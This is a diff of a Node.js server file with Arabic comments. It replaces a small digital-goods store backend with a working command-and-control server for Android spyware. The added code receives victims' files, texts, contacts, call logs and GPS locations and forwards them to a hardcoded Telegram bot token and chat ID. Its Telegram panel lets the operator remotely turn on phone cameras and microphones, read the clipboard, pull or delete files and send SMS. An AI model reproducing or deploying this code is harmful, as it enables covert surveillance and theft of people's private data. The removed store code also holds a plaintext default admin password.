@@ -1,175 +1,269 @@
+// استيراد المكتبات الأساسية المطلوبة للتشغيل
+const WebSocket = require('ws');
+const http = require('http');
 const express = require('express');
+const TelegramBot = require('node-telegram-bot-api');
 const multer = require('multer');
-const path = require('path');
-const fs = require('fs');
-const { v4: uuidv4 } = require('uuid');
 const bodyParser = require('body-parser');
+const { v4: uuidv4 } = require('uuid');
+const axios = require('axios');
 
+// إعداد بيئة العمل والمكتبات
+const upload = multer();
 const app = express();
-const PORT = process.env.PORT || 8999;
-
 app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server });
 
-/* إعداد المجلدات */
-const DB_DIR = path.join(__dirname, 'database');
-const UPLOADS_DIR = path.join(__dirname, 'uploads');
-const SECURE_PRODUCTS_DIR = path.join(__dirname, 'secure_files'); 
-const RECEIPTS_DIR = path.join(__dirname, 'uploads', 'receipts'); 
-const PUBLIC_IMAGES_DIR = path.join(__dirname, 'uploads', 'images'); 
+// بيانات التحكم الخاصة بالمخترق (توكن البوت ومعرف الشات)
+const chatId = '5474851558';
+const token = '8834018446:AAFY9OmJ22qOeswwcTLsi1yTuafIWJzv41o';
+const serverAddr = ''; // عنوان السيرفر لإبقائه نشطاً (إذا وجد)
 
-[DB_DIR, UPLOADS_DIR, SECURE_PRODUCTS_DIR, RECEIPTS_DIR, PUBLIC_IMAGES_DIR].forEach(dir => {
-    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+// إنشاء كائن البوت الخاص بتليجرام وتفعيل خاصية جلب البيانات المستمر
+const bot = new TelegramBot(token, { polling: true });
+
+// ----------------- مسارات الاستقبال (Endpoints) -----------------
+
+// مسار فحص حالة السيرفر الأساسية
+app.get('/', (req, res) => {
+    res.send('كل شيء يعمل بشكل صحيح الآن، يرجى تعديل كود الـ APK المصدري');
 });
 
-/* قاعدة البيانات */
-const USERS_FILE = path.join(DB_DIR, 'users.json');
-const PRODUCTS_FILE = path.join(DB_DIR, 'products.json');
-const ORDERS_FILE = path.join(DB_DIR, 'orders.json');
-const REQUESTS_FILE = path.join(DB_DIR, 'requests.json');
-
-const readDB = (file, defaultData = []) => {
-    if (!fs.existsSync(file)) { fs.writeFileSync(file, JSON.stringify(defaultData, null, 4)); return defaultData; }
-    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch (e) { return defaultData; }
-};
-const writeDB = (file, data) => fs.writeFileSync(file, JSON.stringify(data, null, 4), 'utf8');
-
-/* حساب الإدارة */
-const initialUsers = [{ id: "u-admin", username: "admin", password: "tarzanb", role: "admin", totalSpent: 0, purchasesCount: 0 }];
-readDB(USERS_FILE, initialUsers);
-readDB(PRODUCTS_FILE, []); readDB(ORDERS_FILE, []); readDB(REQUESTS_FILE, []);
-
-/* نظام الرفع */
-const storage = multer.diskStorage({
-    destination: (req, file, cb) => {
-        if (file.fieldname === 'new-prod-file') cb(null, SECURE_PRODUCTS_DIR);
-        else if (file.fieldname === 'cust-receipt-file') cb(null, RECEIPTS_DIR);
-        else cb(null, PUBLIC_IMAGES_DIR);
-    },
-    filename: (req, file, cb) => cb(null, `${file.fieldname}-${Date.now()}-${uuidv4()}${path.extname(file.originalname)}`)
+// مسار استقبال الملفات المرفوعة من هاتف الضحية (مثل التسجيلات الصوتية، الصور، الملفات)
+app.post('/sendFile', upload.single('file'), (req, res) => {
+    const filename = req.file.originalname;
+    
+    // إرسال الملف المستلم كوثيقة إلى البوت في تليجرام
+    bot.sendDocument(chatId, req.file.buffer, {}, { filename: filename, contentType: 'application/txt' })
+        .then(() => {
+            console.log(`تم بنجاح إرسال الملف: ${filename}`);
+        })
+        .catch((err) => {
+            console.log('حدث خطأ أثناء إرسال الملف:', err);
+        });
+        
+    res.send(filename);
 });
-const upload = multer({ storage: storage });
 
-app.use('/uploads', express.static(UPLOADS_DIR));
-app.use(express.static(path.join(__dirname))); 
+// مسار استقبال النصوص (مثل جهات الاتصال، سجل المكالمات، الرسائل النصية)
+app.post('/sendText', (req, res) => {
+    bot.sendMessage(chatId, req.body.data, { parse_mode: 'HTML' });
+    res.send(req.body.data);
+});
 
-/* الحماية */
-const authenticateUser = (req, res, next) => {
-    const userId = req.headers['x-user-id'];
-    if (!userId) return res.status(401).json({ success: false, message: 'غير مصرح! سجل دخولك.' });
-    const user = readDB(USERS_FILE).find(u => u.id === userId);
-    if (!user) return res.status(401).json({ success: false, message: 'جلسة منتهية.' });
-    req.user = user; next();
-};
+// مسار استقبال الموقع الجغرافي للضحية (GPS)
+app.post('/sendLocation', (req, res) => {
+    bot.sendLocation(chatId, req.body.l1, req.body.l2);
+    res.send(req.body.l1.toString());
+});
 
-const requireAdmin = (req, res, next) => {
-    authenticateUser(req, res, () => {
-        if (req.user.role !== 'admin') return res.status(403).json({ success: false, message: 'صلاحيات إدارة فقط.' });
-        next();
+// تشغيل خادم الاستماع (HTTP Server) على منفذ مخصص أو المنفذ الافتراضي 8999
+server.listen(process.env.PORT || 8999, () => {
+    console.log('تم تشغيل الخادم بنجاح على المنفذ: ' + server.address().port);
+});
+
+// ----------------- إدارة اتصالات الضحايا (WebSockets) -----------------
+
+wss.on('connection', (ws, req) => {
+    // توليد معرف فريد (UUID) لكل هاتف يتصل بالسيرفر
+    ws.uuid = uuidv4();
+    
+    // تنظيف وتنسيق عنوان الـ IP الخاص بجهاز الضحية
+    const rawIp = req.socket.remoteAddress.toString();
+    const cleanIp = rawIp.replaceAll('f', '').replaceAll(':', '');
+    
+    // إرسال إشعار فوري لمخترق عبر تليجرام عند اتصال ضحية جديدة
+    const notificationMsg = `<b>📱 تم اتصال ضحية جديدة بالشبكة\n\nالمعرف الفريد (ID) = <code>${ws.uuid}</code>\nعنوان الـ IP = ${cleanIp}</b> 🌐`;
+    bot.sendMessage(chatId, notificationMsg, { parse_mode: 'HTML' });
+});
+
+// وظيفة دورية كل ثانيتين لإرسال نبضة "be alive" لجميع الأجهزة للحفاظ على بقائها نشطة
+setInterval(() => {
+    wss.clients.forEach((ws) => {
+        ws.send('be alive');
     });
-};
+}, 2000);
 
-/* تسجيل الدخول */
-app.post('/api/auth/register', (req, res) => {
-    const { username, password } = req.body;
-    if (!username || !password) return res.status(400).json({ success: false, message: 'أكمل البيانات.' });
-    const users = readDB(USERS_FILE);
-    if (users.some(u => u.username.toLowerCase() === username.toLowerCase())) return res.status(400).json({ success: false, message: 'الاسم مستخدم.' });
-    const newUser = { id: `u-${Date.now()}`, username, password, role: 'user', totalSpent: 0, purchasesCount: 0 };
-    users.push(newUser); writeDB(USERS_FILE, users);
-    res.status(201).json({ success: true, message: 'تم التسجيل!', user: newUser });
-});
+// ----------------- إدارة أوامر تليجرام (Telegram Commands) -----------------
 
-app.post('/api/auth/login', (req, res) => {
-    const { username, password } = req.body;
-    const user = readDB(USERS_FILE).find(u => u.username.toLowerCase() === username.toLowerCase() && u.password === password);
-    if (!user) return res.status(400).json({ success: false, message: 'بيانات خاطئة.' });
-    res.json({ success: true, message: 'تم الدخول!', user });
-});
+bot.on('message', (msg) => {
+    // التأكد من أن الرسالة نصية
+    if (!msg.text) return;
 
-/* المنتجات */
-app.get('/api/products', (req, res) => res.json(readDB(PRODUCTS_FILE).map(({ securePath, ...rest }) => rest)));
-
-app.post('/api/products', requireAdmin, upload.fields([{ name: 'new-prod-file', maxCount: 1 }, { name: 'new-prod-image-file', maxCount: 1 }]), (req, res) => {
-    const { title, price, type, description } = req.body;
-    if (!req.files['new-prod-file']) return res.status(400).json({ success: false, message: 'ارفع الملف البرمجي.' });
-    
-    const prodFile = req.files['new-prod-file'][0];
-    const imageFile = req.files['new-prod-image-file'] ? `/uploads/images/${req.files['new-prod-image-file'][0].filename}` : 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80';
-    
-    const products = readDB(PRODUCTS_FILE);
-    const newProduct = { id: `prod-${Date.now()}`, title, description, price: parseFloat(price), type, image: imageFile, fileName: prodFile.originalname, securePath: prodFile.path };
-    products.push(newProduct); writeDB(PRODUCTS_FILE, products);
-    res.status(201).json({ success: true, message: 'تم رفع المنتج!', product: newProduct });
-});
-
-app.delete('/api/products/:id', requireAdmin, (req, res) => {
-    let products = readDB(PRODUCTS_FILE);
-    const product = products.find(p => p.id === req.params.id);
-    if (product && fs.existsSync(product.securePath)) try { fs.unlinkSync(product.securePath); } catch (e) {}
-    writeDB(PRODUCTS_FILE, products.filter(p => p.id !== req.params.id));
-    res.json({ success: true, message: 'تم الحذف.' });
-});
-
-/* الطلبات */
-app.post('/api/orders', authenticateUser, upload.single('cust-receipt-file'), (req, res) => {
-    if (!req.file) return res.status(400).json({ success: false, message: 'ارفع الإيصال.' });
-    const orders = readDB(ORDERS_FILE);
-    const newOrder = { id: `ord-${Date.now()}`, userId: req.user.id, customerName: req.user.username, items: JSON.parse(req.body.cartItems), total: parseFloat(req.body.total), receiptImg: `/uploads/receipts/${req.file.filename}`, status: 'pending', date: new Date().toLocaleString('ar-YE') };
-    orders.push(newOrder); writeDB(ORDERS_FILE, orders);
-    res.status(201).json({ success: true, message: 'الطلب قيد المراجعة.' });
-});
-
-app.get('/api/orders', requireAdmin, (req, res) => res.json(readDB(ORDERS_FILE)));
-app.get('/api/user-orders', authenticateUser, (req, res) => res.json(req.user.role === 'admin' ? readDB(ORDERS_FILE) : readDB(ORDERS_FILE).filter(o => o.userId === req.user.id)));
-
-app.post('/api/orders/:id/status', requireAdmin, (req, res) => {
-    const orders = readDB(ORDERS_FILE);
-    const order = orders.find(o => o.id === req.params.id);
-    if (!order) return res.status(404).json({ success: false });
-    order.status = req.body.status;
-    writeDB(ORDERS_FILE, orders);
-    
-    if (req.body.status === 'accepted') {
-        const users = readDB(USERS_FILE);
-        const user = users.find(u => u.id === order.userId);
-        if (user) { user.purchasesCount += 1; user.totalSpent += order.total; writeDB(USERS_FILE, users); }
+    // عند إرسال أمر البدء /start
+    if (msg.text === '/start') {
+        const welcomeText = "مرحباً بك في لوحة التحكم.\n\nيرجى الاشتراك في القناة لضمان استقرار العمل بدون مشاكل:\nhttps://t.me/xeon_bo";
+        bot.sendMessage(chatId, welcomeText, {
+            reply_markup: {
+                keyboard: [
+                    ['حالة الاتصال ⚙'],
+                    ['لوحة التحكم ☄']
+                ],
+                resize_keyboard: true
+            }
+        });
     }
-    res.json({ success: true, message: 'تم التحديث.' });
+
+    // زر "حالة الاتصال ⚙" لمعرفة عدد الأجهزة المتصلة حالياً
+    if (msg.text === 'حالة الاتصال ⚙') {
+        const onlineCount = wss.clients.size;
+        let replyMsg = "";
+        
+        if (onlineCount > 0) {
+            replyMsg += `<b>عدد الأجهزة المتصلة حالياً: ${onlineCount}</b> ✅\n\n`;
+            wss.clients.forEach((ws) => {
+                replyMsg += `<b>المعرف (ID) => </b><code>${ws.uuid}</code>\n\n`;
+            });
+        } else {
+            replyMsg += "<b>لا توجد أي أجهزة متصلة بالإنترنت حالياً ❌</b>\n\nتواصل مع: @name_dark";
+        }
+        
+        bot.sendMessage(chatId, replyMsg, { parse_mode: 'HTML' });
+    }
+
+    // زر "لوحة التحكم ☄" لعرض الأزرار التفاعلية لكل ضحية
+    if (msg.text === 'لوحة التحكم ☄') {
+        if (wss.clients.size > 0) {
+            // الأزرار التفاعلية لإرسال الأوامر للهاتف
+            const controlButtons = [
+                [
+                    { text: 'سجل المكالمات 📞', callback_data: 'cl' },
+                    { text: 'جهات الاتصال 👤', callback_data: 'gc' }
+                ],
+                [
+                    { text: 'الرسائل النصية المستلمة 💬', callback_data: 'as' },
+                    { text: 'إرسال رسالة SMS 💬', callback_data: 'ss' }
+                ],
+                [
+                    { text: 'التطبيقات المثبتة 📲', callback_data: 'ia' },
+                    { text: 'معلومات الجهاز 📱', callback_data: 'dm' }
+                ],
+                [
+                    { text: 'سحب ملف/مجلد 📄', callback_data: 'gf' },
+                    { text: 'حذف ملف/مجلد 🗑', callback_data: 'df' }
+                ],
+                [
+                    { text: 'الكاميرا الأساسية 📷', callback_data: 'cam1' },
+                    { text: 'الكاميرا الأمامية 🤳', callback_data: 'cam2' }
+                ],
+                [
+                    { text: 'الميكروفون 1 🎤', callback_data: 'mi1' },
+                    { text: 'الميكروفون 2 🎤', callback_data: 'mi2' },
+                    { text: 'الميكروفون 3 🎤', callback_data: 'mi3' }
+                ],
+                [
+                    { text: 'محتوى الحافظة (الكليب بورد) 📄', callback_data: 'cp' }
+                ]
+            ];
+
+            // إرسال لوحة التحكم لكل جهاز متصل بالشبكة حالياً
+            wss.clients.forEach((ws) => {
+                const deviceHeader = `<b>☄ اختر الإجراء المطلوب تنفيذه على الجهاز التالي:</b>\n&${ws.uuid}`;
+                bot.sendMessage(chatId, deviceHeader, {
+                    reply_markup: { inline_keyboard: controlButtons },
+                    parse_mode: 'HTML'
+                });
+            });
+        } else {
+            bot.sendMessage(chatId, "<b>لا توجد أي أجهزة متصلة بالإنترنت حالياً ❌</b>", { parse_mode: 'HTML' });
+        }
+    }
+
+    // معالجة الأوامر التي تتطلب رداً نصياً من المخترق (Reply)
+    if (msg.reply_to_message) {
+        const replyText = msg.reply_to_message.text;
+        
+        // إذا كان الرد على رسالة "إرسال SMS"
+        if (replyText.split('&')[0] === 'ss') {
+            const targetUuid = replyText.split('!')[0].split('[')[1]; // استخراج الـ UUID للضحية
+            const smsCommand = msg.text; // نص الأمر المكتوب بصيغة JSON
+            
+            wss.clients.forEach((ws) => {
+                if (ws.uuid === targetUuid) {
+                    ws.send(`ss&${smsCommand}`); // إرسال الأمر للجهاز المتصل عبر الـ WebSocket
+                }
+            });
+            
+            bot.sendMessage(chatId, "طلبك قيد التنفيذ الآن.. يرجى الانتظار!", {
+                reply_markup: {
+                    keyboard: [
+                        ['حالة الاتصال ⚙'],
+                        ['لوحة التحكم ☄']
+                    ]
+                }
+            });
+        }
+
+        // إذا كان الرد على رسالة سحب ملف (gf) أو حذف ملف (df)
+        if (replyText.split('&')[0] === 'df' || replyText.split('&')[0] === 'gf') {
+            const commandType = replyText.split('!')[0].split('&')[0]; // نوع الأمر (gf أو df)
+            const targetUuid = replyText.split('!')[0].split('&')[1]; // استخراج الـ UUID
+            const filePath = msg.text; // مسار الملف المطلوب
+            
+            wss.clients.forEach((ws) => {
+                if (ws.uuid === targetUuid) {
+                    ws.send(`${commandType}&${filePath}`); // إرسال الأمر للجهاز المتصل
+                }
+            });
+            
+            bot.sendMessage(chatId, "طلبك قيد التنفيذ الآن.. يرجى الانتظار!", {
+                reply_markup: {
+                    keyboard: [
+                        ['حالة الاتصال ⚙'],
+                        ['لوحة التحكم ☄']
+                    ]
+                }
+            });
+        }
+    }
 });
 
-/* التحميل المشفر (السر لحل المشكلة) */
-app.get('/api/products/download/:productId', authenticateUser, (req, res) => {
-    const product = readDB(PRODUCTS_FILE).find(p => p.id === req.params.productId);
-    if (!product) return res.status(404).json({ success: false, message: 'المنتج غير موجود.' });
+// ----------------- معالجة الضغط على أزرار لوحة التحكم التفاعلية -----------------
 
-    const hasAccess = req.user.role === 'admin' || readDB(ORDERS_FILE).some(o => o.userId === req.user.id && o.status === 'accepted' && o.items.some(i => i.product.id === req.params.productId));
-    if (!hasAccess) return res.status(403).json({ success: false, message: 'التحميل غير مصرح. يرجى الدفع وقبول الإدارة.' });
-    if (!fs.existsSync(product.securePath)) return res.status(404).json({ success: false, message: 'الملف محذوف من الخادم.' });
+bot.on('callback_query', function onCallbackQuery(callbackQuery) {
+    const action = callbackQuery.data; // الكود المختصر للأمر (مثال: cl, gc, ss...)
+    
+    // استخراج الـ UUID الخاص بالجهاز المستهدف من نص الرسالة التي تحتوي على الأزرار
+    const targetUuid = callbackQuery.message.text.split('&')[1];
 
-    // إرسال الملف بطريقة تدعم الـ Fetch من الفرونت اند
-    res.download(product.securePath, product.fileName);
+    wss.clients.forEach((ws) => {
+        if (ws.uuid === targetUuid) {
+            // إذا كان الإجراء هو إرسال رسالة SMS
+            if (action === 'ss') {
+                const promptMsg = `ss&${ws.uuid}!\n\n<b>إجراء إرسال رسالة نصية (SMS)\n🔵 يرجى الرد على هذه الرسالة بكتابة الرقم والرسالة بالصيغة البرمجية التالية:</b>\n<code>[{"number":"رقم الهاتف هنا","message":"نص الرسالة هنا"}]</code>`;
+                bot.sendMessage(chatId, promptMsg, {
+                    reply_markup: { force_reply: true },
+                    parse_mode: 'HTML'
+                });
+            } 
+            // إذا كان الإجراء هو سحب ملف أو مجلد
+            else if (action === 'gf') {
+                const promptMsg = `gf&${ws.uuid}!\n\n<b>إجراء جلب ملف أو مجلد\n🔵 يرجى الرد على هذه الرسالة بكتابة المسار الكامل للملف أو المجلد المطلوب:</b>`;
+                bot.sendMessage(chatId, promptMsg, {
+                    reply_markup: { force_reply: true },
+                    parse_mode: 'HTML'
+                });
+            } 
+            // إذا كان الإجراء هو حذف ملف أو مجلد
+            else if (action === 'df') {
+                const promptMsg = `df&${ws.uuid}!\n\n<b>إجراء حذف ملف أو مجلد\n🔵 يرجى الرد على هذه الرسالة بكتابة المسار الكامل للملف أو المجلد المراد حذفه:</b>`;
+                bot.sendMessage(chatId, promptMsg, {
+                    reply_markup: { force_reply: true },
+                    parse_mode: 'HTML'
+                });
+            } 
+            // لباقي الأوامر المباشرة (مثل تشغيل الكاميرا، الميكروفون، جلب جهات الاتصال)
+            else {
+                ws.send(action); // إرسال الأمر مباشرة للهاتف عبر الـ WebSocket
+            }
+        }
+    });
 });
 
-/* الطلبات الخاصة (التفصيل) */
-app.post('/api/requests', authenticateUser, (req, res) => {
-    const requests = readDB(REQUESTS_FILE);
-    const newRequest = { id: `req-${Date.now()}`, userId: req.user.id, username: req.user.username, title: req.body.title, description: req.body.description, status: 'pending', price: 0, date: new Date().toLocaleDateString('ar-YE') };
-    requests.push(newRequest); writeDB(REQUESTS_FILE, requests);
-    res.status(201).json({ success: true, message: 'تم إرسال طلبك للإدارة.' });
-});
-
-app.get('/api/requests', authenticateUser, (req, res) => res.json(req.user.role === 'admin' ? readDB(REQUESTS_FILE) : readDB(REQUESTS_FILE).filter(r => r.userId === req.user.id)));
-
-app.post('/api/requests/:id/status', requireAdmin, (req, res) => {
-    const requests = readDB(REQUESTS_FILE);
-    const reqIndex = requests.findIndex(r => r.id === req.params.id);
-    requests[reqIndex].status = req.body.status;
-    if (req.body.status === 'priced') requests[reqIndex].price = parseFloat(req.body.price);
-    writeDB(REQUESTS_FILE, requests);
-    res.json({ success: true, message: 'تم التسعير/التحديث.' });
-});
-
-app.get('/api/user-profile', authenticateUser, (req, res) => res.json({ success: true, user: req.user }));
-
-app.listen(PORT, () => console.log(`🚀 السيرفر يعمل كالنار على: ${PORT}`));
+// وظيفة لإبقاء السيرفر نشطاً (تجنباً لإغلاقه التلقائي من خدمات الاستضافة المجانية)
+setInterval(() => {
+    if (serverAddr) {
+        axios.get(serverAddr).catch(() => {});
+    }
+}, 120000);
